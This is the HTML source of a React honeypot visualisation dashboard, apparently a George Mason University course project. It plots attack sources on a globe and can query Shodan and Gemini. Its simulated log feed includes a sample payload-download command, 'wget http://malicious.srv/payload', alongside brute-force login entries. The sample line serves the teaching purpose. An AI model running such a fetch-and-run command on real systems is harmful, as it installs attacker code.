<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PatriotPot | Enterprise Threat Monitor</title>

    <!-- PORTABILITY CHECK: OFFLINE DETECTION -->
    <script>
        window.addEventListener('error', function (e) {
            if (e.target.tagName === 'SCRIPT') {
                document.body.innerHTML = `
                    <div style="height:100vh; background:#010b05; color:#006633; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:monospace; text-align:center;">
                        <h1 style="font-size:24px; color:#FFCC33; margin-bottom:10px;">⚠ NETWORK UPLINK FAILED</h1>
                        <p style="color:#6b8c7a;">SECURE VISUALIZATION LIBRARIES COULD NOT BE REACHED.</p>
                        <p style="color:#444; font-size:12px; margin-top:20px;">ERROR: CDN_CONNECTION_TIMEOUT<br>PLEASE VERIFY INTERNET CONNECTIVITY TO LOAD THREAT MAP.</p>
                    </div>
                `;
            }
        }, true);
    </script>

    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- React & ReactDOM -->
    <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
    <!-- Babel (Pinned to prevent local file crash) -->
    <script src="https://unpkg.com/@babel/standalone@7.23.6/babel.min.js"></script>
    <!-- Globe.gl -->
    <script src="https://unpkg.com/globe.gl"></script>
    <!-- Google Fonts -->
    <link
        href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@300;400;500;600;700&family=JetBrains+Mono:wght@200;400;700&display=swap"
        rel="stylesheet">

    <style>
        /* GMU Enterprise Palette: Forest Green, Gold, White */
        :root {
            --bg-color: #010b05;
            /* Deepest Green/Black */
            --panel-bg: rgba(0, 26, 13, 0.94);
            --border-color: rgba(255, 204, 51, 0.3);
            /* GMU Gold */
            --accent-green: #006633;
            /* GMU Green */
            --accent-bright-green: #4ade80;
            /* For text readability */
            --accent-gold: #FFCC33;
            /* GMU Gold */
            --text-muted: #6b8c7a;
        }

        body {
            margin: 0;
            overflow: hidden;
            background-color: var(--bg-color);
            font-family: 'JetBrains Mono', monospace;
        }

        .tech-font {
            font-family: 'Chakra Petch', sans-serif;
        }

        /* High-Fidelity Glass Panels */
        .glass-panel {
            background: var(--panel-bg);
            backdrop-filter: blur(8px);
            border: 1px solid var(--border-color);
            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.5);
            position: relative;
        }

        /* Technical Corner Markers */
        .glass-panel::before {
            content: '';
            position: absolute;
            top: -1px;
            left: -1px;
            width: 10px;
            height: 10px;
            border-top: 2px solid var(--accent-gold);
            border-left: 2px solid var(--accent-gold);
        }

        .glass-panel::after {
            content: '';
            position: absolute;
            bottom: -1px;
            right: -1px;
            width: 10px;
            height: 10px;
            border-bottom: 2px solid var(--accent-gold);
            border-right: 2px solid var(--accent-gold);
        }

        /* Crisp Text Styles */
        .stat-label {
            font-size: 0.65rem;
            letter-spacing: 0.1em;
            color: var(--text-muted);
            text-transform: uppercase;
        }

        .stat-value {
            font-weight: 700;
            color: white;
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
        }

        /* Grid Background - Subtle Engineering Graph */
        .grid-bg {
            background-image:
                linear-gradient(rgba(0, 102, 51, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 102, 51, 0.05) 1px, transparent 1px);
            background-size: 50px 50px;
        }

        /* Radar Scanline */
        @keyframes scan {
            0% { transform: translateY(-100%); opacity: 0; }
            50% { opacity: 0.3; }
            100% { transform: translateY(100vh); opacity: 0; }
        }

        .scan-line {
            position: absolute;
            inset: 0;
            background: linear-gradient(to bottom, transparent, var(--accent-gold), transparent);
            height: 2px;
            opacity: 0.1;
            animation: scan 8s linear infinite;
            pointer-events: none;
            z-index: 0;
        }

        /* Scrollbar */
        ::-webkit-scrollbar { width: 3px; }
        ::-webkit-scrollbar-track { background: #001a0d; }
        ::-webkit-scrollbar-thumb { background: var(--accent-gold); }
    </style>
</head>

<body>
    <div id="root"></div>

    <script type="text/babel" data-presets="react">
        const { useState, useEffect, useRef } = React;

        // --- ENTERPRISE METRICS (Final Report Data) ---
        const METRICS = {
            totalEvents: 109024,
            uniqueIPs: 2338,
            successRate: "59.5%",
            duration: "48 DAYS",
            region: "us-east-1",
            az: "use1-az4",
            instance: "i-0xf38... (t2.micro)"
        };

        const TARGET_LOC = { lat: 39.0438, lng: -77.4874, label: "AWS US-EAST-1" };

        const MALICIOUS_ACTORS = [
            { ip: "47.252.29.174", location: "Mountain View, US", isp: "Alibaba Cloud", lat: 37.38, lng: -122.08, color: "#FFCC33" }, // Gold
            { ip: "120.48.170.78", location: "Beijing, CN", isp: "IDC", lat: 39.90, lng: 116.40, color: "#FFCC33" },
            { ip: "101.47.50.42", location: "Shanghai, CN", isp: "ChinaNet", lat: 31.23, lng: 121.47, color: "#ffffff" }, // White
            { ip: "119.28.138.1", location: "Singapore, SG", isp: "Tencent", lat: 1.35, lng: 103.81, color: "#FFCC33" },
            { ip: "223.19.20.1", location: "Hong Kong, HK", isp: "HK Broadband", lat: 22.31, lng: 114.16, color: "#4ade80" }, // Bright Green
            { ip: "190.50.20.1", location: "Port of Spain, TT", isp: "Flow", lat: 10.65, lng: -61.51, color: "#ffffff" },
            { ip: "125.215.199.37", location: "Taipei, TW", isp: "HiNet", lat: 25.03, lng: 121.56, color: "#4ade80" },
            { ip: "122.187.229.220", location: "New Delhi, IN", isp: "Airtel", lat: 28.61, lng: 77.20, color: "#ffffff" }
        ];

        // --- API HELPERS ---
        const fetchShodanHost = async (ip, apiKey) => {
            if (apiKey) {
                try {
                    const r = await fetch(`https://api.shodan.io/shodan/host/${ip}?key=${apiKey}`);
                    if (r.ok) return await r.json();
                } catch (e) { }
            }
            try {
                const r = await fetch(`https://internetdb.shodan.io/${ip}`);
                if (!r.ok) throw new Error();
                const d = await r.json();
                return { org: d.hostnames?.[0] || "Unknown", os: "N/A", ports: d.ports, vulns: d.vulns };
            } catch (e) { throw new Error("Lookup Failed"); }
        };

        const callGemini = async (prompt, apiKey) => {
            try {
                const r = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
                    method: "POST", headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] })
                });
                const d = await r.json();
                return d.candidates?.[0]?.content?.parts?.[0]?.text || "No Analysis.";
            } catch (e) { throw new Error("AI Uplink Failed"); }
        };

        // --- COMPONENTS ---

        // HELP / LEGEND MODAL FOR STUDENTS
        const HelpModal = ({ isOpen, onClose }) => {
            if (!isOpen) return null;
            return (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm" onClick={onClose}>
                    <div className="glass-panel p-6 w-[600px] text-gray-300" onClick={e => e.stopPropagation()}>
                        <div className="flex justify-between items-center mb-4 border-b border-white/10 pb-2">
                            <h3 className="text-white tech-font text-lg">CLASSROOM LEGEND</h3>
                            <button onClick={onClose} className="text-gray-400 hover:text-white">&times;</button>
                        </div>
                        <div className="grid grid-cols-2 gap-6 text-xs font-mono">
                            <div>
                                <h4 className="text-[#FFCC33] font-bold mb-2">VISUALIZATION CODES</h4>
                                <ul className="space-y-2">
                                    <li className="flex items-center gap-2"><span className="w-2 h-2 rounded-full bg-[#FFCC33]"></span> <span>GOLD: High Frequency Attack Source</span></li>
                                    <li className="flex items-center gap-2"><span className="w-2 h-2 rounded-full bg-[#4ade80]"></span> <span>GREEN: New/Active Connection</span></li>
                                    <li className="flex items-center gap-2"><span className="w-2 h-2 rounded-full bg-white"></span> <span>WHITE: Historical Log Entry</span></li>
                                </ul>
                            </div>
                            <div>
                                <h4 className="text-green-500 font-bold mb-2">TERMINOLOGY</h4>
                                <ul className="space-y-2">
                                    <li><strong className="text-white">HONEYPOT:</strong> A decoy system (PatriotPot) designed to lure attackers to study their behavior.</li>
                                    <li><strong className="text-white">AUTH_FAIL:</strong> Attempted brute-force login (SSH/RDP).</li>
                                    <li><strong className="text-white">PAYLOAD:</strong> Malware/Script download attempt.</li>
                                </ul>
                            </div>
                        </div>
                        <div className="mt-6 pt-4 border-t border-white/10 text-[10px] text-gray-500 text-center">
                            AIT-670: CYBER ATTACK VISUALIZATION PROJECT
                        </div>
                    </div>
                </div>
            );
        };

        const KeyModal = ({ isOpen, type, onClose, onSave }) => {
            if (!isOpen) return null;
            const [val, setVal] = useState("");
            return (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm">
                    <div className="glass-panel p-6 w-96">
                        <h3 className="text-white tech-font text-lg mb-2">AUTHORIZATION REQUIRED</h3>
                        <p className="text-xs text-gray-400 mb-4">ENTER API KEY FOR {type}</p>
                        <input className="w-full bg-black/50 border border-gray-600 p-2 text-white text-xs mb-4 focus:border-green-500 outline-none"
                            onChange={e => setVal(e.target.value)} placeholder="****************" />
                        <div className="flex justify-end gap-2">
                            <button onClick={onClose} className="px-3 py-1 text-xs text-gray-400 hover:text-white">CANCEL</button>
                            <button onClick={() => onSave(val)} className="px-3 py-1 text-xs bg-green-800 text-white hover:bg-green-700">AUTHENTICATE</button>
                        </div>
                    </div>
                </div>
            );
        };

        const ConfigModal = ({ isOpen, onClose, keys, onSave }) => {
            if (!isOpen) return null;
            const [shodan, setShodan] = useState(keys.shodan || "");
            const [gemini, setGemini] = useState(keys.gemini || "");

            const handleSave = () => {
                onSave({ shodan, gemini });
                onClose();
            };

            return (
                <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm" onClick={onClose}>
                    <div className="glass-panel p-6 w-96" onClick={e => e.stopPropagation()}>
                        <h3 className="text-white tech-font text-lg mb-4">SYSTEM CONFIGURATION</h3>

                        <div className="mb-4">
                            <label className="text-[10px] text-gray-500 mb-1 block">SHODAN API KEY (OPTIONAL)</label>
                            <input className="w-full bg-black/50 border border-gray-600 p-2 text-white text-xs focus:border-green-500 outline-none font-mono"
                                type="password"
                                value={shodan}
                                onChange={e => setShodan(e.target.value)}
                                placeholder="LEAVE BLANK FOR FREE TIER" />
                        </div>

                        <div className="mb-6">
                            <label className="text-[10px] text-gray-500 mb-1 block">GEMINI API KEY (REQUIRED FOR AI)</label>
                            <input className="w-full bg-black/50 border border-gray-600 p-2 text-white text-xs focus:border-green-500 outline-none font-mono"
                                type="password"
                                value={gemini}
                                onChange={e => setGemini(e.target.value)}
                                placeholder="ENTER GOOGLE GEMINI KEY" />
                        </div>

                        <div className="flex justify-end gap-2">
                            <button onClick={onClose} className="px-3 py-1 text-xs text-gray-400 hover:text-white">CANCEL</button>
                            <button onClick={handleSave} className="px-3 py-1 text-xs bg-[#FFCC33] text-black font-bold hover:bg-[#ffe082]">SAVE CONFIG</button>
                        </div>
                    </div>
                </div>
            );
        };

        const DetailModal = ({ isOpen, onClose, title, data, loading }) => {
            if (!isOpen) return null;
            return (
                <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/50 backdrop-blur-sm">
                    <div className="glass-panel w-[600px] max-h-[80vh] flex flex-col">
                        <div className="p-3 border-b border-white/10 flex justify-between items-center bg-white/5">
                            <h3 className="text-white tech-font text-sm tracking-wider">{title}</h3>
                            <button onClick={onClose} className="text-gray-400 hover:text-white">&times;</button>
                        </div>
                        <div className="p-6 overflow-y-auto text-xs text-gray-300 font-mono">
                            {loading ? <div className="text-green-400 animate-pulse">>> FETCHING INTELLIGENCE...</div> :
                                (typeof data === 'string' ? <div className="whitespace-pre-wrap leading-relaxed">{data}</div> :
                                    <div className="grid grid-cols-2 gap-4">
                                        <div className="p-2 border border-white/10"><div className="text-gray-500 mb-1">ISP/ORG</div><div className="text-white">{data.org || data.isp}</div></div>
                                        <div className="p-2 border border-white/10"><div className="text-gray-500 mb-1">OS GUESS</div><div className="text-white">{data.os || "Unknown"}</div></div>
                                        <div className="col-span-2 p-2 border border-white/10">
                                            <div className="text-gray-500 mb-2">OPEN PORTS</div>
                                            <div className="flex gap-2 flex-wrap">{data.ports?.map(p => <span key={p} className="px-1.5 py-0.5 bg-white/10 text-green-400">{p}</span>)}</div>
                                        </div>
                                    </div>
                                )}
                        </div>
                    </div>
                </div>
            );
        };

        const Dashboard = () => {
            const globeEl = useRef();
            const [day, setDay] = useState(1);
            const [play, setPlay] = useState(false);
            const [logs, setLogs] = useState([]);

            const [keys, setKeys] = useState({ shodan: localStorage.getItem("shodan_key"), gemini: localStorage.getItem("gemini_key") });
            const [modal, setModal] = useState({ open: false, type: null, action: null });
            const [info, setInfo] = useState({ open: false, title: "", data: null, loading: false });
            const [helpOpen, setHelpOpen] = useState(false);
            const [configOpen, setConfigOpen] = useState(false);

            // CONFIG SAVE
            const saveConfig = (newKeys) => {
                localStorage.setItem("shodan_key", newKeys.shodan);
                localStorage.setItem("gemini_key", newKeys.gemini);
                setKeys(newKeys);
            };

            // DOWNLOAD SELF FUNCTIONALITY
            const downloadSelf = () => {
                const htmlContent = document.documentElement.outerHTML;
                const blob = new Blob([htmlContent], { type: "text/html" });
                const url = URL.createObjectURL(blob);
                const a = document.createElement("a");
                a.href = url;
                a.download = "PatriotPot_Instructor_Tool.html";
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            };

            // EXPORT LOGS
            const exportLogs = () => {
                const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(logs, null, 2));
                const a = document.createElement('a');
                a.href = dataStr;
                a.download = `honeypot_logs_session_${new Date().getTime()}.json`;
                a.click();
            };

            // Actions
            const scanIP = (ip) => {
                setInfo({ open: true, title: `TARGET: ${ip}`, loading: true });
                fetchShodanHost(ip, keys.shodan)
                    .then(d => setInfo(prev => ({ ...prev, loading: false, data: d })))
                    .catch(() => setInfo(prev => ({ ...prev, loading: false, data: "DATA UNAVAILABLE" })));
            };

            const analyzeLog = (log) => {
                if (!keys.gemini) {
                    setModal({
                        open: true, type: 'GEMINI AI', action: (k) => {
                            localStorage.setItem("gemini_key", k);
                            setKeys(p => ({ ...p, gemini: k }));
                            runAI(log, k);
                        }
                    });
                } else runAI(log, keys.gemini);
            };

            const runAI = (log, k) => {
                setInfo({ open: true, title: "AI THREAT ANALYSIS", loading: true });
                callGemini(`Analyze honeypot log: ${log.message}`, k)
                    .then(res => setInfo(prev => ({ ...prev, loading: false, data: res })))
                    .catch(() => setInfo(prev => ({ ...prev, loading: false, data: "AI SERVICE UNREACHABLE" })));
            };

            // Loop
            useEffect(() => {
                let interval;
                if (play) interval = setInterval(() => setDay(d => d >= 48 ? 1 : d + 1), 800);
                return () => clearInterval(interval);
            }, [play]);

            // Data Feed Simulation
            useEffect(() => {
                if (play) {
                    const atk = MALICIOUS_ACTORS[Math.floor(Math.random() * MALICIOUS_ACTORS.length)];
                    const acts = [
                        { m: "SSH: Invalid user admin from " + atk.ip, t: "AUTH_FAIL" },
                        { m: "CMD: wget http://malicious.srv/payload", t: "PAYLOAD" },
                        { m: "RECON: Port scan detected on tcp/22", t: "RECON" },
                        { m: "SSH: Accepted password for root", t: "CRITICAL" }
                    ];
                    const act = acts[Math.floor(Math.random() * acts.length)];
                    // Pass Lat/Lng for Synchronization
                    setLogs(prev => [{ uid: Math.random(), ts: new Date().toISOString().split('T')[1].split('.')[0], ip: atk.ip, lat: atk.lat, lng: atk.lng, ...act, color: atk.color }, ...prev].slice(0, 50));
                }
            }, [day, play]);

            // Globe Initialization
            useEffect(() => {
                const world = Globe()
                    (document.getElementById('globe'))
                    .globeImageUrl('https://unpkg.com/three-globe/example/img/earth-night.jpg')
                    .bumpImageUrl('https://unpkg.com/three-globe/example/img/earth-topology.png')
                    .backgroundImageUrl('https://unpkg.com/three-globe/example/img/night-sky.png')
                    .pointsData(MALICIOUS_ACTORS.map(t => ({ ...t, size: 0.5 })))
                    .pointAltitude(0.01)
                    .pointColor('color')
                    .pointRadius('size')
                    .onPointClick(d => scanIP(d.ip))
                    .labelsData([TARGET_LOC])
                    .labelText(d => d.label || `${d.ip} [${d.isp || 'UNKNOWN'}]`)
                    .labelSize(1.2)
                    .labelDotRadius(0.3)
                    .labelColor(() => "#FFCC33")
                    .arcColor('color')
                    .arcDashLength(0.4)
                    .arcDashGap(0.2)
                    .arcStroke(0.5);

                world.controls().autoRotate = false; // Start paused
                world.camera().position.set(0, 50, 250);
                globeEl.current = world;
            }, []);

            // Globe Synchronization (Logs & Pause)
            useEffect(() => {
                if (globeEl.current) {
                    // 1. Sync AutoRotate with Play
                    globeEl.current.controls().autoRotate = play;

                    // 2. Sync Animation Speed (Freeze when paused)
                    // 1500 = Standard speed, 1e9 = Effectively frozen
                    globeEl.current.arcDashAnimateTime(play ? 1500 : 1e9);

                    // 3. Sync Data: Only show arcs for active logs
                    // Deduplicate IPs to prevent messy stacking
                    const activeAttacks = logs.reduce((acc, log) => {
                        if (!acc.find(a => a.ip === log.ip)) {
                            acc.push(log);
                        }
                        return acc;
                    }, []);

                    globeEl.current.arcsData(activeAttacks.map(t => ({
                        startLat: t.lat,
                        startLng: t.lng,
                        endLat: TARGET_LOC.lat,
                        endLng: TARGET_LOC.lng,
                        color: [t.color, "#006633"]
                    })));
                }
            }, [logs, play]);

            return (
                <div className="w-full h-screen relative grid-bg">
                    <div id="globe" className="absolute inset-0 z-0" />
                    <div className="scan-line"></div>

                    <KeyModal isOpen={modal.open} type={modal.type} onClose={() => setModal({ open: false })} onSave={(k) => { modal.action(k); setModal({ open: false }); }} />
                    <ConfigModal isOpen={configOpen} onClose={() => setConfigOpen(false)} keys={keys} onSave={saveConfig} />
                    <DetailModal isOpen={info.open} onClose={() => setInfo({ ...info, open: false })} {...info} />
                    <HelpModal isOpen={helpOpen} onClose={() => setHelpOpen(false)} />

                    {/* TOP HUD */}
                    <div className="absolute top-0 left-0 w-full p-6 flex justify-between items-start pointer-events-none z-10">
                        <div className="pointer-events-auto">
                            <div className="flex items-baseline gap-2">
                                <h1 className="text-4xl font-bold tech-font text-white tracking-tight">PATRIOT<span className="text-[#FFCC33]">POT</span></h1>
                                <span className="text-[10px] text-green-500 font-mono border border-green-800 px-1 py-0.5 rounded">v2.4.0</span>
                            </div>

                            {/* DISCLAIMER ADDITION */}
                            <div className="my-2 border-l-2 border-gray-600 pl-2">
                                <p className="text-[9px] text-gray-400 font-mono max-w-[400px] leading-relaxed opacity-80">
                                    <span className="text-red-400 font-bold">DISCLAIMER:</span> All IPs verified malicious by GreyNoise/IPBan at capture time.
                                    Due to dynamic ISP reuse, addresses older than 30 days should not be assumed currently hostile.
                                </p>
                            </div>

                            <div className="mt-1 flex flex-col gap-0.5">
                                <div className="text-xs text-[#FFCC33] font-mono tracking-widest flex items-center gap-2">
                                    <span className="w-1.5 h-1.5 bg-[#FFCC33] rounded-full animate-pulse"></span>
                                    EC2 | US-EAST-1 | NORTHERN VIRGINIA
                                </div>
                                <div className="text-[10px] text-gray-500 font-mono">INSTANCE: {METRICS.instance}</div>
                            </div>
                        </div>

                        {/* INSTRUCTOR CONTROLS - TOP RIGHT */}
                        <div className="flex gap-2 pointer-events-auto">
                            {/* CLASSROOM METRICS */}
                            {[
                                { l: "EVENTS", v: METRICS.totalEvents.toLocaleString(), c: "text-white" },
                                { l: "UNIQUE IPs", v: METRICS.uniqueIPs.toLocaleString(), c: "text-[#FFCC33]" }
                            ].map((m, i) => (
                                <div key={i} className="glass-panel p-2 w-24 text-center hidden md:block">
                                    <div className="stat-label mb-1">{m.l}</div>
                                    <div className={`stat-value text-lg tech-font ${m.c}`}>{m.v}</div>
                                </div>
                            ))}

                            <div className="flex flex-col gap-2">
                                <button onClick={() => setHelpOpen(true)} className="glass-panel w-32 h-8 flex items-center justify-center text-xs text-white hover:bg-white/10 border-green-500">
                                    ? LEGEND
                                </button>
                                <button onClick={() => setConfigOpen(true)} className="glass-panel w-32 h-8 flex items-center justify-center text-xs text-white hover:bg-white/10 border-green-500">
                                    CONFIG
                                </button>
                                <button onClick={downloadSelf} className="glass-panel w-32 h-8 flex items-center justify-center text-xs font-bold text-[#010b05] bg-[#FFCC33] hover:bg-[#ffe082]">
                                    SAVE TOOL
                                </button>
                            </div>
                        </div>
                    </div>

                    {/* ATTACK VECTORS - TOP RIGHT */}
                    <div className="absolute top-48 right-6 w-64 glass-panel p-4 pointer-events-auto z-10">
                        <div className="flex justify-between items-center mb-3 border-b border-white/10 pb-1">
                            <span className="stat-label text-green-400">VECTOR ANALYSIS</span>
                            <span className="text-[9px] text-gray-500">N=109k</span>
                        </div>
                        <div className="space-y-3 font-mono text-[10px]">
                            {[
                                { l: "CREDENTIAL ACCESS", p: 77, c: "bg-white" },
                                { l: "RECONNAISSANCE", p: 10, c: "bg-[#FFCC33]" },
                                { l: "FILE DOWNLOAD", p: 8, c: "bg-green-500" },
                                { l: "EXECUTION", p: 5, c: "bg-green-800" }
                            ].map((v, i) => (
                                <div key={i}>
                                    <div className="flex justify-between text-gray-400 mb-1">
                                        <span>{v.l}</span>
                                        <span>{v.p}%</span>
                                    </div>
                                    <div className="h-1 bg-black/50 w-full">
                                        <div className={`h-full ${v.c}`} style={{ width: `${v.p}%` }}></div>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* BOTTOM CONTROLS & LOGS */}
                    <div className="absolute bottom-6 left-6 right-6 flex items-end justify-between pointer-events-none z-10">

                        {/* TIMELINE CONTROL */}
                        <div className="glass-panel p-4 w-[500px] pointer-events-auto flex items-center gap-4">
                            <button onClick={() => setPlay(!play)} className={`w-10 h-10 flex items-center justify-center border ${play ? 'border-[#FFCC33] text-[#FFCC33]' : 'border-green-500 text-green-500'} hover:bg-white/5 transition-colors`}>
                                <span className="font-bold text-xs">{play ? '||' : '▶'}</span>
                            </button>
                            <div className="flex-1">
                                <div className="flex justify-between text-[9px] text-green-400 mb-1 font-mono tracking-wider">
                                    <span>T+ {day} DAYS</span>
                                    <span>WINDOW: {METRICS.duration}</span>
                                </div>
                                <div className="h-1.5 bg-black/50 border border-green-900 w-full relative">
                                    <div className="absolute top-0 left-0 h-full bg-[#FFCC33]" style={{ width: `${(day / 48) * 100}%` }}></div>
                                </div>
                            </div>
                        </div>

                        {/* LIVE TERMINAL FEED */}
                        <div className="glass-panel w-[450px] h-64 flex flex-col pointer-events-auto">
                            <div className="p-2 border-b border-white/10 bg-black/20 flex justify-between items-center">
                                <div className="flex flex-col">
                                    <span className="stat-label text-[#FFCC33]">LIVE MALICIOUS FEED</span>
                                    <span className="text-[8px] text-gray-500">FILTER: EXCLUDING SCANNERS</span>
                                </div>
                                <div className="flex items-center gap-2">
                                    <button onClick={exportLogs} className="text-[9px] border border-gray-600 px-2 py-0.5 hover:bg-white/10 text-gray-300">EXPORT LOGS</button>
                                    <div className="flex gap-1">
                                        <span className="w-1 h-1 bg-gray-600"></span>
                                        <span className="w-1 h-1 bg-green-500"></span>
                                    </div>
                                </div>
                            </div>
                            <div className="flex-1 overflow-y-auto p-2 space-y-1 font-mono text-[10px] text-gray-400">
                                {logs.map(l => (
                                    <div key={l.uid} className="grid grid-cols-[40px_90px_1fr_auto] gap-2 hover:bg-white/5 p-1 cursor-pointer transition-colors" onClick={() => scanIP(l.ip)}>
                                        <span className="text-gray-600">{l.ts}</span>
                                        <span className="text-gray-300">{l.ip}</span>
                                        <span className={`truncate ${l.t === 'AUTH_FAIL' ? 'text-red-400' : l.t === 'PAYLOAD' ? 'text-[#FFCC33]' : 'text-green-300'}`}>{l.m}</span>
                                        <button onClick={(e) => { e.stopPropagation(); analyzeLog(l) }} className="text-[8px] border border-gray-700 px-1 hover:border-green-500 hover:text-green-500">AI</button>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>

                    {/* BRANDING */}
                    <div className="absolute bottom-1 w-full text-center z-20 pointer-events-none">
                        <div className="text-[9px] text-[#FFCC33] font-mono tracking-[0.3em] uppercase opacity-70">
                            George Mason University | College of Engineering and Computing | AIT-670
                        </div>
                    </div>
                </div>
            );
        };

        const root = ReactDOM.createRoot(document.getElementById('root'));
        root.render(<Dashboard />);
    </script>
</body>
</html>
